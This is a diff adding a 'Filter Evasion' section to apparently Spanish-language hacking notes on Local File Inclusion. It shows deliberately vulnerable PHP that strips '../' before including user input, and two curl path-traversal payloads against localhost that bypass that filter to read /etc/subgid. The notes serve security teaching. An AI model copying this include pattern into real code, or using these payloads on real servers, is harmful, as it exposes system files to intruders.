@@ -2195,7 +2195,28 @@ Cabe decir que el **Null Byte Injection** fue arreglado en PHP a partir de la ve
 
 **Filter Evasion**
 
+Código del servidor:
 
+```php
+<?php
+$file = str_replace('../', '', $_GET['file']);
+if(isset($file))
+{
+  include("lib/functions/$file");
+}
+```
+
+Petición malintencionada:
+
+```bash
+┌─[root@parrot]─[/var/www/html]
+└──╼ #curl --silent "http://localhost/index.php?file=..%2F..%2F..%2F..%2F..%2Fetc/subgid"
+s4vitar:100000:65536
+┌─[root@parrot]─[/var/www/html]
+└──╼ #curl --silent "http://localhost/index.php?file=....//....//....//....//....//etc/subgid"
+s4vitar:100000:65536
+┌─[root@parrot]─[/var/www/html]
+```
 
 
 #### RFI
